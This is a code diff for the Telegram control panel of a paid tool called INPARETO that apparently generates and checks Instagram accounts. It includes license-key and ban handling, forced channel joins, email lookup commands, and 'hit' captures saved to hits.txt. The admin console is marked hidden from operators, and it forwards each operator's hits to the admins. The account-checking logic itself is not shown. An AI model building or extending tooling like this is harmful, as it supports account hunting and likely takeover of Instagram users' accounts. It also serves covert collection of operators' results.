+        else:
+            display = str(raw)[:60] if raw else "—"
+        lines.append(f"  <b>{key}</b>  <code>{html.escape(str(display))}</code>\n")
+    admins = ", ".join(_admin_settings.get("admin_ids", [])) or "—"
+    lines.append(f"\n  <b>admins</b>  <code>{html.escape(admins)}</code>\n")
+    return "".join(lines)
+
+
+def admin_apply_set_key(key, value):
+    key = (key or "").lower().strip()
+    if key not in ADMIN_SET_REGISTRY:
+        return f"Unknown key <code>{html.escape(key)}</code>. Send <code>/set</code> for the full guide."
+    field, hint, max_len = ADMIN_SET_REGISTRY[key]
+    value = (value or "").strip()
+    if not value:
+        return f"Usage: <code>/set {key}</code> &lt;value&gt;\n<i>{html.escape(hint)}</i>"
+    if key == "channel":
+        value = value.lstrip("@")[:max_len]
+    else:
+        value = value[:max_len]
+    _admin_settings[field] = value
+    err = admin_save_settings()
+    label = key.replace("bot", "bot ")
+    return f"<b>{label.strip()}</b> saved. {err or 'OK'}"
+
+
+def admin_handle_set(command):
+    parts = command.strip().split(None, 2)
+    if len(parts) < 2:
+        return admin_format_set_guide()
+    sub = parts[1].lower()
+    if sub in {"help", "guide", "list", "?"}:
+        return admin_format_set_list() if sub == "list" else admin_format_set_guide()
+    if sub == "admin":
+        uid = (parts[2] if len(parts) > 2 else "").strip()
+        if not uid:
+            return "Usage: <code>/set admin TELEGRAM_USER_ID</code>"
+        ids = set(_admin_settings.get("admin_ids", []))
+        ids.add(uid)
+        _admin_settings["admin_ids"] = sorted(ids)
+        err = admin_save_settings()
+        return f"Admin added: <code>{html.escape(uid)}</code>. {err or ''}"
+    if sub in {"rebrand", "apply", "sync"}:
+        bot_msg = rebrand_all_operator_bots()
+        grp_msg = rebrand_all_operator_hit_groups()
+        return f"{bot_msg}\n{grp_msg}"
+    if sub == "botdefaults":
+        return admin_format_set_list()
+    if len(parts) < 3:
+        return admin_apply_set_key(sub, "")
+    return admin_apply_set_key(sub, parts[2])
+
+
+def admin_format_help():
+    return (
+        format_panel_header()
+        + "<b>◈ ADMIN CONSOLE</b>\n\n"
+        + "<i>Hidden — operators never see this.</i>\n\n"
+        + "<b>◉ Config hub</b>\n"
+        + "<code>/set</code>  full key guide + examples\n"
+        + "<code>/set list</code>  live values from cloud\n\n"
+        + "<b>◉ Access</b>\n"
+        + "<code>/force NAME LINK</code>  <code>/forcelist</code>  <code>/forcedel NAME</code>\n"
+        + "<code>/addadmin ID</code>  <i>(shortcut for /set admin)</i>\n\n"
+        + "<b>◉ Users</b>\n"
+        + "<code>/ban ID reason</code>  <code>/unban ID</code>  <code>/users</code>\n\n"
+        + "<b>◉ Paid access</b>\n"
+        + "<code>/licensegen 30</code>  <i>days · generates INPA- key</i>\n"
+        + "<code>/grant ID 30</code>  <code>/revoke ID</code>\n"
+        + "<code>/licenseinfo ID</code>  <code>/licenses</code>  <code>/licensekeys</code>\n\n"
+        + "<b>◉ Ops</b>\n"
+        + "<code>/broadcast message</code>  <code>/adminstats</code>\n"
+        + "<code>/rebrand</code>  <i>apply bot name/desc/photo to all bots</i>\n\n"
+        + f"<i>Logs/hits via admin bot · {admin_channel_tag()}</i>"
+    )
+
+
+def admin_notify_admins_dm(text):
+    for admin_id in _admin_settings.get("admin_ids", []):
+        if admin_id:
+            admin_send_message(admin_id, text)
+
+
+def admin_notify_hit_summary(username, followers, following, operator_id=None):
+    op_id = operator_id or TELEGRAM_CHAT_ID
+    op_link = telegram_profile_link_html(op_id)
+    text = (
+        format_panel_header()
+        + "<b>◈ ADMIN · HIT ALERT</b>\n\n"
+        + f"<b>@{html.escape(username)}</b>\n"
+        + f"Followers <code>{html.escape(str(followers))}</code> · "
+        + f"Following <code>{html.escape(str(following))}</code>\n"
+        + f"<b>Operator</b> {op_link}\n"
+        + f"<b>Channel</b> {admin_channel_tag()}"
+    )
+    admin_notify_admins_dm(text)
+
+
+def admin_process_command(command, from_user_id):
+    if not admin_is_admin(from_user_id):
+        return None
+    parts = command.strip().split(maxsplit=2)
+    head = parts[0].lower() if parts else ""
+    args = parts[1:] if len(parts) > 1 else []
+
+    if head in {"/admin", "/adminhelp"}:
+        return admin_format_help()
+    if head == "/set":
+        return admin_handle_set(command)
+    if head in ADMIN_SET_LEGACY:
+        key = ADMIN_SET_LEGACY[head]
+        if key in ("botname", "botdesc", "botshort"):
+            rest = command.split(None, 1)
+            return admin_apply_set_key(key, rest[1] if len(rest) > 1 else "")
+        return admin_apply_set_key(key, args[0] if args else "")
+    if head == "/addadmin" and args:
+        return admin_handle_set(f"/set admin {args[0]}")
+    if head in {"/botdefaults", "/get"}:
+        return admin_format_set_list()
+    if head in {"/rebrand", "/rebrandall"}:
+        return rebrand_all_operator_bots()
+    if head == "/force" and len(args) >= 2:
+        name = args[0].strip()
+        link = args[1].strip()
+        chat_id, invite = admin_parse_chat_target(link)
+        if not invite:
+            return "Invalid link"
+        err = admin_upsert_force_join(name, chat_id or invite, invite)
+        admin_invalidate_access()
+        return f"Force-join added: {name}. {err or 'OK'}"
+    if head == "/forcelist":
+        rows, err = admin_fetch_force_join_targets()
+        if err:
+            return err
+        if not rows:
+            return "No force-join targets."
+        lines = ["<b>Force join list</b>\n"]
+        for row in rows:
+            lines.append(
+                f"  <b>{html.escape(row['preview_name'])}</b>\n"
+                f"  <code>{html.escape(row.get('chat_id', ''))}</code>\n"
+                f"  {html.escape(row.get('invite_link', ''))}\n"
+            )
+        return "".join(lines)
+    if head == "/forcedel" and args:
+        err = admin_delete_force_join(args[0].strip())
+        admin_invalidate_access()
+        return f"Removed {args[0]}. {err or 'OK'}"
+    if head == "/ban" and args:
+        uid = args[0].strip()
+        reason = args[1].strip() if len(args) > 1 else "Policy"
+        err = admin_ban_operator(uid, reason, from_user_id)
+        admin_invalidate_access(uid)
+        pause_event.clear()
+        return f"Banned {uid}. {err or ''}"
+    if head == "/unban" and args:
+        uid = args[0].strip()
+        err = admin_unban_operator(uid)
+        admin_invalidate_access(uid)
+        return f"Unbanned {uid}. {err or ''}"
+    if head in {"/licensegen", "/genkey"}:
+        days = license_parse_duration_days(args[0] if args else "30")
+        key, err = license_generate_key(days, from_user_id)
+        if err:
+            return f"Key failed: {err}"
+        if not key:
+            return "Key generation failed."
+        return (
+            f"<b>License key · {days} day(s)</b>\n\n"
+            f"<code>{html.escape(key)}</code>\n\n"
+            f"<i>User redeems with</i> <code>/redeem {html.escape(key)}</code>"
+        )
+    if head == "/grant" and len(args) >= 2:
+        uid = args[0].strip()
+        days = license_parse_duration_days(args[1])
+        ok, result = license_grant_user(uid, days, by_admin=from_user_id, source="manual")
+        if not ok:
+            return f"Grant failed: {result}"
+        return (
+            f"Granted <b>{days}d</b> to <code>{html.escape(uid)}</code>\n"
+            f"Expires: {license_format_expiry(result)}"
+        )
+    if head == "/revoke" and args:
+        uid = args[0].strip()
+        err = license_revoke_user(uid)
+        return f"Revoked license for <code>{html.escape(uid)}</code>. {err or 'OK'}"
+    if head == "/licenseinfo" and args:
+        uid = args[0].strip()
+        snap = plan_build_snapshot(uid)
+        if snap.get("tier") == "admin":
+            return f"<b>Admin</b> · unlimited\nID <code>{html.escape(uid)}</code>"
+        if snap.get("plan") == PLAN_PREMIUM and snap.get("active"):
+            return (
+                f"<b>INPARETO Premium</b>\n"
+                f"ID <code>{html.escape(uid)}</code>\n"
+                f"Expires {license_format_expiry(snap.get('expires_at'))}"
+            )
+        if snap.get("plan") == PLAN_FREE:
+            used = int(snap.get("day_count") or 0)
+            limit = int(snap.get("limit") or FREE_DAILY_GEN_LIMIT)
+            trial = license_format_expiry(snap.get("trial_ends_at"))
+            status = "expired" if snap.get("trial_expired") else "active"
+            return (
+                f"<b>INPARETO Free</b> ({status})\n"
+                f"ID <code>{html.escape(uid)}</code>\n"
+                f"Trial ends {trial}\n"
+                f"Today {used:,}/{limit:,} generated"
+            )
+        return f"No active plan ({snap.get('reason') or 'unknown'}). ID <code>{html.escape(uid)}</code>"
+    if head == "/licenses":
+        reg, err = license_fetch_registry(force=True)
+        if err:
+            return f"Load failed: {err}"
+        now = datetime.now(timezone.utc)
+        lines = ["<b>Active licenses</b>\n"]
+        count = 0
+        for uid, row in sorted(reg.get("licenses", {}).items()):
+            exp = license_parse_iso(row.get("expires_at"))
+            if not exp or exp <= now:
+                continue
+            count += 1
+            lines.append(
+                f"  <code>{html.escape(uid)}</code> → {license_format_expiry(exp)}\n"
+                f"  <i>{html.escape(row.get('source', ''))}</i>\n"
+            )
+        if not count:
+            lines.append("<i>None active.</i>\n")
+        return "".join(lines)
+    if head == "/licensekeys":
+        reg, err = license_fetch_registry(force=True)
+        if err:
+            return f"Load failed: {err}"
+        lines = ["<b>Unused keys</b>\n"]
+        unused = 0
+        for key, row in reg.get("keys", {}).items():
+            if row.get("redeemed_by"):
+                continue
+            unused += 1
+            lines.append(
+                f"  <code>{html.escape(key)}</code> · {row.get('days')}d\n"
+            )
+        if not unused:
+            lines.append("<i>None — use /licensegen 30</i>\n")
+        return "".join(lines)
+    if head == "/broadcast":
+        msg = command.split(None, 1)
+        if len(msg) < 2:
+            return "Usage: /broadcast your message"
+        body = (
+            format_panel_header()
+            + "<b>◈ INPARETO Broadcast</b>\n\n"
+            + html.escape(msg[1])
+            + f"\n\n<i>{admin_channel_tag()}</i>"
+        )
+        return admin_broadcast_message(body)
+    if head == "/users":
+        devices, err = admin_fetch_all_devices(30)
+        if err:
+            return err
+        lines = ["<b>Recent devices</b>\n"]
+        for row in devices[:15]:
+            lines.append(
+                f"  {html.escape(row.get('display_name', '?'))} · "
+                f"<code>{row.get('telegram_chat_id', '?')}</code>\n"
+                f"  <code>{row.get('device_hash', '')[:12]}…</code>\n"
+            )
+        return "".join(lines)
+    if head == "/adminstats":
+        devices, _ = admin_fetch_all_devices()
+        targets, _ = admin_fetch_force_join_targets()
+        return (
+            f"<b>Admin stats</b>\n"
+            f"Devices: {len(devices)}\n"
+            f"Force joins: {len(targets)}\n"
+            f"Logs: <code>{_admin_settings.get('logs_group_id') or '—'}</code>\n"
+            f"Hits: <code>{_admin_settings.get('hits_group_id') or '—'}</code>\n"
+        )
+    return "Unknown command. <code>/admin</code> overview · <code>/set</code> full config guide"
+
+
+def admin_gate_reply_for_user(from_user_id):
+    entitled, plan_reason, plan_info = operator_plan_entitled(from_user_id)
+    if not entitled:
+        exp = plan_info.get("expires_at") if isinstance(plan_info, dict) else None
+        return format_operator_plan_gate(plan_reason or "no_license", plan_info, exp), None
+    granted, state = admin_user_access_granted(from_user_id)
+    if not granted:
+        if state == "banned":
+            return admin_format_gate_message(reason="banned"), None
+        if state in ("trial_expired", "expired", "cloud_offline", "no_license"):
+            return format_operator_plan_gate(state, plan_info), None
+        missing = state if isinstance(state, list) else []
+        kb = admin_join_gate_keyboard(missing)
+        return admin_format_gate_message(missing=missing), kb
+    hg_ok, hg_reason = operator_hit_group_access_state()
+    if not hg_ok:
+        return format_hit_group_gate_message(hg_reason), hit_group_gate_keyboard()
+    return None, None
+
+
+def get_throughput_metrics():
+    elapsed = (datetime.now(timezone.utc) - START_TIME).total_seconds()
+    with lock:
+        generated = gen
+        hits_count = hit
+        error_count = errors
+        valid_count = valid
+    if elapsed < 1:
+        elapsed = 1
+    gen_per_min = generated / (elapsed / 60)
+    hits_per_hr = hits_count / (elapsed / 3600)
+    err_pct = (error_count / generated * 100) if generated else 0.0
+    avg_sec_per_gen = elapsed / generated if generated else 0.0
+    return {
+        "gen_per_min": gen_per_min,
+        "hits_per_hr": hits_per_hr,
+        "err_pct": err_pct,
+        "avg_sec_per_gen": avg_sec_per_gen,
+        "generated": generated,
+        "hits_count": hits_count,
+        "valid_count": valid_count,
+        "error_count": error_count,
+        "elapsed": elapsed,
+    }
+
+
+def format_stats():
+    uptime = format_duration((datetime.now(timezone.utc) - START_TIME).total_seconds())
+    with lock:
+        generated = gen
+        valid_count = valid
+        hits_count = hit
+        error_count = errors
+        min_followers = MIN_FOLLOWERS
+        timeout_value = TIMEOUT
+        thread_count = THREAD_COUNT
+        events = list(event_log)
+
+    success_rate = (valid_count / generated * 100) if generated else 0.0
+    hit_rate = (hits_count / generated * 100) if generated else 0.0
+    valid_ratio = (hits_count / valid_count * 100) if valid_count else 0.0
+    active_threads = len(worker_threads) or thread_count
+    tp = get_throughput_metrics()
+
+    events_block = ""
+    visible_events = _operator_visible_events(events)
+    if visible_events:
+        recent = "\n".join(
+            f"  {S['bullet']} {html.escape(e[-68:])}" for e in visible_events[-3:]
+        )
+        events_block = tg_section("LIVE FEED") + recent
+
+    live_line = ""
+    if LIVE_WATCH:
+        if LIVE_PANEL.get("view") == "stats":
+            live_line = (
+                f"\n{S['on']} <b>Live</b>  <code>refresh / {LIVE_WATCH_INTERVAL}s</code>\n"
+            )
+        else:
+            live_line = (
+                f"\n{S['off']} <b>Live</b>  <i>armed {S['dash']} paused "
+                f"{S['dash']} open {S['btn_dash']} Stats</i>\n"
+            )
+
+    return (
+        format_panel_header()
+        + f"<b>Status</b>  {tg_state_badge()}   <b>Uptime</b>  <code>{uptime}</code>\n"
+        + live_line
+        + tg_section("SESSION")
+        + tg_row("Generated", f"{generated:,}")
+        + tg_row("Valid", f"{valid_count:,}")
+        + tg_row("Hits", f"{hits_count:,}")
+        + tg_row("Errors", f"{error_count:,}")
+        + tg_section("SPEED")
+        + tg_row("Gen/min", f"{tp['gen_per_min']:.1f}")
+        + tg_row("Hits/hr", f"{tp['hits_per_hr']:.1f}")
+        + tg_section("PERFORMANCE")
+        + f"  {S['bullet']} Success  <code>{success_rate:5.1f}%</code>  {tg_progress(success_rate)}\n"
+        + f"  {S['bullet']} Hit      <code>{hit_rate:5.1f}%</code>  {tg_progress(hit_rate)}\n"
+        + f"  {S['bullet']} Conv.    <code>{valid_ratio:5.1f}%</code>  {tg_progress(valid_ratio)}\n"
+        + tg_section("RUNTIME")
+        + tg_row("Service", f"http://{ip}:{port}")
+        + tg_row("Min target", f"{_min_followers_display()} followers")
+        + tg_row("Timeout", f"{timeout_value}s")
+        + tg_row("Workers", f"{active_threads}/{thread_count}")
+        + events_block
+        + f"\n<i>{S['bullet']} Tap Stats to refresh · enable auto-refresh in More.</i>"
+    )
+
+
+def format_analytics():
+    uptime = format_duration((datetime.now(timezone.utc) - START_TIME).total_seconds())
+    tp = get_throughput_metrics()
+    with lock:
+        generated = tp["generated"]
+        hits_count = tp["hits_count"]
+        valid_count = tp["valid_count"]
+        error_count = tp["error_count"]
+
+    success_rate = (valid_count / generated * 100) if generated else 0.0
+    hit_rate = (hits_count / generated * 100) if generated else 0.0
+    valid_ratio = (hits_count / valid_count * 100) if valid_count else 0.0
+
+    hits_file = "hits.txt"
+    archive_size = 0
+    if os.path.exists(hits_file):
+        archive_size = os.path.getsize(hits_file)
+
+    return (
+        format_panel_header()
+        + f"<b>{S['btn_analytics']} Analytics</b>\n\n"
+        + tg_row("Uptime", uptime)
+        + tg_section("THROUGHPUT")
+        + tg_row("Checks/min", f"{tp['gen_per_min']:.2f}")
+        + tg_row("Hits/hour", f"{tp['hits_per_hr']:.2f}")
+        + tg_row("Avg sec/gen", f"{tp['avg_sec_per_gen']:.2f}s")
+        + tg_row("Error rate", f"{tp['err_pct']:.2f}%")
+        + tg_section("FUNNEL")
+        + tg_row(f"Generated {S['arrow']} Valid", f"{success_rate:.2f}%")
+        + tg_row(f"Generated {S['arrow']} Hit", f"{hit_rate:.2f}%")
+        + tg_row(f"Valid {S['arrow']} Hit", f"{valid_ratio:.2f}%")
+        + tg_section("ARCHIVE")
+        + tg_row("hits.txt", f"{archive_size:,} bytes")
+        + tg_row("Hit alerts", "always on")
+        + tg_row("Live panel", "on" if LIVE_WATCH else "off")
+    )
+
+
+def format_health():
+    ok, detail, latency_ms = check_backend_health()
+    badge = (
+        f"<code>{S['on']} ONLINE</code>" if ok else f"<code>{S['off']} OFFLINE</code>"
+    )
+    return (
+        format_panel_header()
+        + f"<b>{S['btn_health']} Backend Health</b>\n\n"
+        + f"  {S['bullet']} Status    {badge}\n"
+        + tg_row("Endpoint", f"http://{ip}:{port}")
+        + tg_row("Latency", f"{latency_ms}ms")
+        + tg_row("Detail", detail)
+    )
+
+
+def format_reset_confirm():
+    return (
+        format_panel_header()
+        + f"<b>{S['btn_reset']} Reset Session Stats</b>\n\n"
+        + "Counters (generated, valid, hits, errors) will zero out.\n"
+        + "<b>hits.txt is not deleted.</b>\n\n"
+        + "<i>Confirm below or cancel.</i>"
+    )
+
+
+def format_logout_confirm():
+    support = resolve_support_contact_html()
+    return (
+        format_panel_header()
+        + f"<b>{S['btn_logout']} Log out</b>\n\n"
+        + "<b>This clears everything linked on this device:</b>\n"
+        + f"  {S['bullet']} Telegram bot session\n"
+        + f"  {S['bullet']} Hit group binding\n"
+        + f"  {S['bullet']} Cloud device profile (archived)\n"
+        + f"  {S['bullet']} Local saved credentials\n\n"
+        + "<b>All data will be removed from this installation.</b>\n"
+        + f"<i>Recovery is possible — contact support: {support}</i>\n\n"
+        + "<i>Tap <b>Yes, log out</b> to confirm, or <b>Cancel</b> to stay logged in.</i>"
+    )
+
+
+def format_settings():
+    with lock:
+        min_followers = MIN_FOLLOWERS
+        timeout_value = TIMEOUT
+        thread_count = THREAD_COUNT
+    return (
+        format_panel_header()
+        + f"<b>{S['btn_set']} Runtime Configuration</b>\n\n"
+        + tg_row("Min followers", _min_followers_display())
+        + tg_row("Request timeout", f"{timeout_value}s")
+        + tg_row("Worker threads", str(thread_count))
+        + tg_row("Backend", f"{ip}:{port}")
+        + tg_row("Hit alerts", "always on")
+        + tg_row("Live dashboard", "on" if LIVE_WATCH else "off")
+        + "\n"
+        + f"<b>{S['bullet']} Quick</b>  {S['btn_down']}/{S['btn_up']} Min  ·  {S['btn_plus']} Threads\n\n"
+        + f"<b>{S['bullet']} Commands</b>\n"
+        + f"  {S['bullet']} <code>/set min 25</code>\n"
+        + f"  {S['bullet']} <code>/set timeout 45</code>\n"
+        + f"  {S['bullet']} <code>/set threads 30</code>\n\n"
+        + "<i>Changes apply instantly without restart.</i>"
+    )
+
+
+def format_help():
+    return (
+        format_panel_header()
+        + f"<b>{S['btn_guide']} Command Reference</b>\n\n"
+        + tg_section("NAVIGATION")
+        + f"  {S['bullet']} <code>/start</code>  {S['dash']} Welcome panel\n"
+        + f"  {S['bullet']} <code>/stats</code>  {S['dash']} Live dashboard\n"
+        + f"  {S['bullet']} <code>/settings</code>  {S['dash']} Config\n"
+        + f"  {S['bullet']} <code>/hits</code>  {S['dash']} Recent captures\n"
+        + f"  {S['bullet']} <code>/saved</code>  {S['dash']} ★ favorites → favorites.txt\n"
+        + f"  {S['bullet']} <code>/hitgroup</code>  {S['dash']} Link hit delivery group\n"
+        + f"  {S['bullet']} <code>/verifyhitgroup</code>  {S['dash']} Confirm bot admin\n"
+        + f"  {S['bullet']} <code>/help</code>  {S['dash']} This guide\n"
+        + f"  {S['bullet']} <code>/status</code>  {S['dash']} One-tap snapshot\n"
+        + f"  {S['bullet']} <code>/check</code>  {S['dash']} Full health check + fixes\n"
+        + f"  {S['bullet']} <code>/api</code>  {S['dash']} Gateway probe\n"
+        + f"  {S['bullet']} <code>/cloud</code>  {S['dash']} Supabase sync\n"
+        + tg_section("CONTROL")
+        + f"  {S['bullet']} <code>/pause</code>  {S['dash']} Freeze workers\n"
+        + f"  {S['bullet']} <code>/resume</code>  {S['dash']} Resume hunt\n"
+        + tg_section("TUNING")
+        + f"  {S['bullet']} <code>/set min &lt;n&gt;</code>\n"
+        + f"  {S['bullet']} <code>/set timeout &lt;sec&gt;</code>\n"
+        + f"  {S['bullet']} <code>/set threads &lt;n&gt;</code>\n"
+        + tg_section("PROFILE")
+        + f"  {S['bullet']} <code>/profile</code>  {S['dash']} Operator card\n"
+        + f"  {S['bullet']} <code>/leaderboard</code>  {S['dash']} Session ranks\n"
+        + f"  {S['bullet']} <code>/badges</code>  {S['dash']} Achievements\n"
+        + tg_section("TOOLS")
+        + f"  {S['bullet']} <code>/lookup gmail email</code>\n"
+        + f"  {S['bullet']} <code>/lookup insta email</code>\n"
+        + f"  {S['bullet']} <code>/gen 1-5 min</code>  {S['dash']} Max 5 · min ≤5000\n"
+        + tg_section("MORE")
+        + f"  {S['bullet']} <code>/analytics</code>  {S['dash']} Deep stats\n"
+        + f"  {S['bullet']} <code>/health</code>  {S['dash']} Backend ping\n"
+        + f"  {S['bullet']} <code>/export</code>  {S['dash']} Send hits.txt\n"
+        + f"  {S['bullet']} <code>/saved</code>  {S['dash']} Send favorites.txt (★ fav list)\n"
+        + f"  {S['bullet']} <code>/live on|off</code>  {S['dash']} Auto-refresh\n"
+        + f"  {S['bullet']} <code>/reset</code>  {S['dash']} Zero counters\n"
+        + tg_section("PLAN")
+        + f"  {S['bullet']} <code>/plan</code>  {S['dash']} Free trial & daily quota\n"
+        + f"  {S['bullet']} <code>/redeem KEY</code>  {S['dash']} Upgrade to Premium\n"
+        + f"  {S['bullet']} <code>/mylicense</code>  {S['dash']} Premium expiry & status\n"
+        + tg_section("ACCOUNT")
+        + f"  {S['bullet']} <code>/logout</code>  {S['dash']} Log out (confirmation required)\n"
+        + tg_section("GROUPS")
+        + f"  {S['bullet']} Same commands work in your hit group (linked account only)\n"
+        + f"  {S['bullet']} Privacy ON → use <code>/stats@YourBot</code> style\n"
+        + f"  {S['bullet']} INPARETO admins can also use this bot (DM or group)\n"
+        + f"  {S['bullet']} Others in the group cannot control your bot\n\n"
+        + "<i>Use inline buttons for one-tap access.</i>"
+    )
+
+
+def format_startup():
+    started = datetime.now(timezone.utc).strftime("%d %b %Y · %H:%M UTC")
+    return (
+        format_panel_header()
+        + f"<b>{S['on']} Client Online</b>\n\n"
+        + f"<i>{S['bullet']} Developed by S Crew · bridge connected.</i>\n"
+        + tg_row("Started", started)
+        + tg_row("Service", f"http://{ip}:{port}")
+        + tg_row("Workers", str(THREAD_COUNT))
+        + tg_row("Timeout", f"{TIMEOUT}s")
+        + tg_row("Min", f"{_min_followers_display()} followers")
+        + "\n"
+        + "<i>Open the dashboard or pause anytime from the panel below.</i>"
+    )
+
+
+def format_action_notice(title, detail, tag="OK", *, detail_html=None):
+    if detail_html is None:
+        detail_html = any(
+            token in str(detail)
+            for token in ("<code>", "<b>", "<i>", "<a ", "<pre>", "</")
+        )
+    detail_body = detail if detail_html else html.escape(str(detail))
+    return (
+        format_panel_header()
+        + f"<b>{S['bullet']} {html.escape(tag)}</b>  {html.escape(title)}\n\n"
+        + f"{detail_body}\n\n"
+        + f"<b>State</b>  {tg_state_badge()}"
+    )
+
+
+def format_hits_message(limit=2):
+    raw = get_last_hits(limit)
+    if raw == "No saved hits available.":
+        return (
+            format_panel_header()
+            + f"<b>{S['btn_hits']} Hit Archive</b>\n\n"
+            + "<i>No captures saved yet. They will appear here automatically.</i>"
+        )
+    body = html.escape(raw)
+    if len(body) > 3500:
+        body = body[-3500:] + "\n…"
+    return (
+        format_panel_header()
+        + f"<b>{S['btn_hits']} Recent Captures</b>\n\n"
+        + f"<pre>{body}</pre>"
+    )
+
+
+def create_hit_keyboard(username):
+    profile_url = f"https://www.instagram.com/{username}"
+    fav_label = "★ In favorites" if is_favorite_username(username) else "★ Add to fav"
+    return {
+        "inline_keyboard": [
+            [
+                {"text": f"{S['btn_profile']} Open profile", "url": profile_url},
+                {"text": fav_label, "callback_data": f"FAV:{username[:48]}"},
+            ],
+        ]
+    }
+
+
+HIT_BOX_VALUE_GAP = 4
+HIT_BOX_TAIL_PAD = 30
+HIT_BOX_TAIL_OPTIONS = (30, 24, 18, 12, 8, 6, 4, 3, 0)
+HIT_BOX_MAX_CORE_LEN = 30
+HIT_BOX_NBSP = "\u00a0"
+HIT_HEADER_INNER_W = 24
+
+
+def _tg_utf16_len(text):
+    """Telegram caption/text limits count UTF-16 code units."""
+    return len((text or "").encode("utf-16-le")) // 2
+
+
+def _hit_box_pad(label, label_w):
+    text = str(label)
+    if len(text) >= label_w:
+        return text
+    return text + (HIT_BOX_NBSP * (label_w - len(text)))
+
+
+def _hit_box_body(label, value, label_w):
+    val = str(value if value is not None else "-").strip() or "-"
+    gap = HIT_BOX_NBSP * HIT_BOX_VALUE_GAP
+    return f"{_hit_box_pad(label, label_w)}{gap}{val}"
+
+
+def _hit_row_prefix(label, label_w):
+    return f"{_hit_box_pad(label, label_w)}{HIT_BOX_NBSP * HIT_BOX_VALUE_GAP}"
+
+
+def _hit_trim_field_value(prefix, value_plain, max_core):
+    """Keep rows narrow enough for mobile blockquote — avoids wrap gaps."""
+    budget = max_core - len(prefix)
+    if budget < 1:
+        return str(value_plain)[:1]
+    vp = str(value_plain)
+    if len(vp) <= budget:
+        return vp
+    return vp[: budget - 1] + "…"
+
+
+def _hit_box_effective_max_body(bodies):
+    raw = max((len(b) for b in bodies), default=0)
+    return min(raw, HIT_BOX_MAX_CORE_LEN)
+
+
+def _hit_quality_display(quality_stars, *, pending=False):
+    if pending:
+        return "···"
+    stars = max(1, min(5, int(quality_stars or 1)))
+    return f"{'★' * stars}{'☆' * (5 - stars)} ({stars}star)"
+
+
+def _hit_row_suffix(prefix, value_plain, max_body, *, tail_pad=HIT_BOX_TAIL_PAD):
+    pad = max_body - len(prefix) - len(value_plain)
+    if pad > 0:
+        return HIT_BOX_NBSP * pad
+    return ""
+
+
+def _hit_render_quote_line(
+    prefix, value_plain, max_body, *, value_html=None, strike=False, tail_pad=HIT_BOX_TAIL_PAD,
+):
+    value_plain = _hit_trim_field_value(prefix, value_plain, max_body)
+    row = prefix + value_plain
+    if len(row) < max_body:
+        row += HIT_BOX_NBSP * (max_body - len(row))
+    tail = " " * tail_pad
+    if strike:
+        # No <code> — mono blocks <s>; plain quote text + outer strike wrapper.
+        if value_html:
+            pad = max_body - len(prefix) - len(value_plain)
+            pad_part = (HIT_BOX_NBSP * pad) if pad > 0 else ""
+            return (
+                f"{html.escape(prefix)}"
+                f"<tg-spoiler>{html.escape(value_plain)}</tg-spoiler>"
+                f"{html.escape(pad_part)}{tail}"
+            )
+        return html.escape(row) + tail
+    if value_html:
+        pad_part = _hit_row_suffix(prefix, value_plain, max_body, tail_pad=tail_pad)
+        return (
+            f"<code>{html.escape(prefix)}</code>"
+            f"{value_html}"
+            f"<code>{html.escape(pad_part)}</code>{tail}"
+        )
+    return f"<code>{html.escape(row)}</code>{tail}"
+
+
+def _hit_box_label_width(raw_groups):
+    return max(len(str(label)) for group in raw_groups for label, _ in group)
+
+
+def _hit_box_format_groups(raw_groups, *, strike=False, tail_pad=HIT_BOX_TAIL_PAD):
+    label_w = _hit_box_label_width(raw_groups)
+    bodies = [
+        _hit_box_body(label, value, label_w)
+        for group in raw_groups
+        for label, value in group
+    ]
+    max_body = _hit_box_effective_max_body(bodies)
+    out = []
+    for group in raw_groups:
+        group_rows = []
+        for label, value in group:
+            prefix = _hit_row_prefix(label, label_w)
+            value_plain = str(value)
+            if label == "Username":
+                line = _hit_render_quote_line(
+                    prefix,
+                    value_plain,
+                    max_body,
+                    value_html=f"<tg-spoiler>{html.escape(value_plain)}</tg-spoiler>",
+                    strike=strike,
+                    tail_pad=tail_pad,
+                )
+            else:
+                line = _hit_render_quote_line(
+                    prefix, value_plain, max_body, strike=strike, tail_pad=tail_pad,
+                )
+            group_rows.append(line)
+        out.append(group_rows)
+    return out
+
+
+def _hit_quote_pre_box(rows):
+    """One blockquote; merge plain rows into a single <code> block (mobile-safe)."""
+    if isinstance(rows, str):
+        rows = [line for line in rows.splitlines() if line.strip()]
+    rows = [str(row) for row in rows]
+    if any("<tg-spoiler>" in r for r in rows):
+        return f"<blockquote>{chr(10).join(rows)}</blockquote>"
+
+    cores = []
+    tail = ""
+    for row in rows:
+        if row.startswith("<code>") and "</code>" in row:
+            core, _, rest = row.partition("</code>")
+            cores.append(core[len("<code>"):])
+            if rest:
+                tail = rest
+        else:
+            cores.append(row)
+    if cores:
+        return f"<blockquote><code>{chr(10).join(cores)}</code>{tail}</blockquote>"
+    return f"<blockquote>{chr(10).join(rows)}</blockquote>"
+
+
+def _hit_caption_header_box(*, tail_pad=HIT_BOX_TAIL_PAD):
+    bar = "━" * HIT_HEADER_INNER_W
+    tail = " " * tail_pad
+    top = html.escape(f"┏{bar}┓")
+    mid = (
+        f"┃ {html.escape(TG_BRAND)} · "
+        f"<i>{html.escape(TG_TAGLINE)}</i>"
+        f"{html.escape(tail)}"
+    )
+    bot = html.escape(f"┗{bar}┛")
+    return f"<b>{top}\n{mid}\n{bot}</b>"
+
+
+def _hit_caption_footer_ts(timestamp):
+    ts = (timestamp or datetime.now(timezone.utc).strftime("%d %b %Y • %H:%M UTC")).upper()
+    return f"<b>[ {html.escape(ts)} ]</b>"
+
+
+def _hit_operator_plain():
+    uid = resolve_operator_telegram_id() or str(TELEGRAM_CHAT_ID or "").strip()
+    if not uid:
+        return "—"
+    info = fetch_telegram_user(uid) or lookup_telegram_user_display(uid)
+    if info and info.get("display_name"):
+        return str(info["display_name"])[:28]
+    if info and info.get("username"):
+        return f"@{info['username']}"
+    return uid
+
+
+def _hit_support_plain():
+    admin_load_settings()
+    admin_ids = [str(a) for a in _admin_settings.get("admin_ids", []) if a]
+    if not admin_ids:
+        return "—"
+    info = lookup_telegram_user_display(admin_ids[0])
+    if info and info.get("username"):
+        return f"@{info['username']}"
+    return admin_ids[0]
+
+
+def _hit_channel_plain():
+    admin_load_settings()
+    return "@" + (_admin_settings.get("channel_username") or "inpareto").lstrip("@")
+
+
+def _hit_box_row_groups(
+    username,
+    name,
+    followers,
+    following,
+    posts_display,
+    quality_stars,
+    contact_details,
+    *,
+    pending=False,
+):
+    quality = _hit_quality_display(quality_stars, pending=pending)
+    joined = (contact_details.get("joined") or "").strip() or "—"
+    email = (contact_details.get("email") or "").strip() or "—"
